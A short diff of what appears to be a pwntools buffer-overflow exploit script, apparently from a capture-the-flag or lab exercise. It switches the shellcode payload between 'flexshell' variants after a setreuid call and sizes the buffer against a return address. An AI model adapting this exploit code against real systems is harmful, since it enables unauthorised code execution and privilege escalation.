@@ -22,8 +22,8 @@ buffid2 = int(buffid1,16)
 payload = asm(shellcraft.setreuid(1000))
 # payload += asm(shellcraft.sh())
 # Code with no /bin/sh that works below
-# payload += asm(flexshell.nobinsh())
-payload += asm(flexshell.compact())
+payload += asm(flexshell.nobinsh())
+# payload += asm(flexshell.compact())
 lengthofbuff = lengthofbuff - len(payload)
 lengthofbuff = lengthofbuff - len(buffid)
 # the return address memory is located at 137 bytes
